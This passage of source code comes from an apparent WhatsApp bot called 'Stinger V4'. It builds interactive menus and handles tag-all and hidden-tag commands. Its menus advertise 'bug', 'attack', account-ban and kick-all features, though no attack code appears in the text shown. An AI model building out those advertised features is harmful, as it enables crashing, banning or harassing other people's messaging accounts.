╰━━━━━━❄️◁️🕷️━━━━━━╯
╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴛᴏᴏʟꜱ
> 𝐞𝐧𝐜 [ 𝐜𝐨𝐝𝐞 ]◁️❄️🕷️
> 𝐞𝐧𝐜𝐫𝐲𝐩𝐭 [ 𝐜𝐨𝐝𝐞 ] ◁️❄️🕷️
> 𝐚𝐢 [ 𝐭𝐞𝐱𝐭 ]◁️❄️🕷️`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'stinger-banner': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯

╰⭑➤➤⭑➤➤⭑➤  ꜱᴛɪɴɢᴇʀ ʙᴀɴɴᴇʀ +
> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧𝟐 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧𝟑◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐚𝐧𝟒◁️❄️🕷️`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'sting-plus': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯
╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴛᴏᴏʟꜱ +
> 𝐦𝐞𝐧𝐮 ◁️❄️🕷️
> 𝐭𝐞𝐬𝐭 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐮𝐩𝐝𝐚𝐭𝐞 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐚𝐢 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐚𝐧𝐢𝐦𝐞 ◁️❄️🕷️
> 𝐫𝐮𝐧𝐭𝐢𝐦𝐞 ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤ ᴘʀᴇᴍɪᴜᴍ ᴘᴀʏᴍᴇɴᴛ
> 𝐬𝐭𝐢𝐧𝐠-𝐩𝐚𝐲 ◁️❄️🕷️
> 𝐜𝐨𝐧𝐟𝐢𝐫𝐦-𝐩𝐚𝐲 ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤  ꜱᴛɪɴɢᴇʀ ɢʀᴏᴜᴘ +
> 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐬𝐚𝐯𝐞 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐝𝐞𝐥 ◁️❄️🕷️
> 𝐤𝐢𝐜𝐤𝐚𝐥𝐥 ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤  ꜱᴛɪɴɢᴇʀ ᴏᴡɴᴇʀ +
> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐥𝐨𝐜𝐤 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐮𝐧𝐛𝐥𝐨𝐜𝐤 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️

𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒.𝟎.𝟏`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'groupmenu': {
await loading()
const version = require("baileys/package.json").version
const groupmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯
╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ɢʀᴏᴜᴘ
> 𝐡𝐢𝐝𝐞𝐭𝐚𝐠 ◁️❄️🕷️
> 𝐭𝐚𝐠𝐚𝐥𝐥 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐤𝐢𝐜𝐤 ◁️❄️🕷️
> 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 ◁️❄️🕷️
> 𝐝𝐞𝐦𝐨𝐭𝐞 ◁️❄️🕷️`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: groupmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'esteams': {
await loading()
const version = require("baileys/package.json").version
const ownermenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯
╰⭑➤➤⭑➤➤⭑➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
> 𝐬𝐞𝐭-𝐬𝐭𝐢𝐧𝐠 ◁️❄️🕷️
> 𝐚𝐝𝐝-𝐬𝐭𝐢𝐧𝐠 ◁️❄️🕷️
> 𝐭𝐞𝐬𝐭 ◁️❄️🕷️
> 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 ◁️❄️🕷️
> 𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 ◁️❄️🕷️
> 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 ◁️❄️🕷️️`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: ownermenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
zyn.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐂𝐚𝐧𝐧𝐨𝐭 𝐅𝐢𝐧𝐝 𝐚 𝐓𝐞𝐱𝐭🧊`)
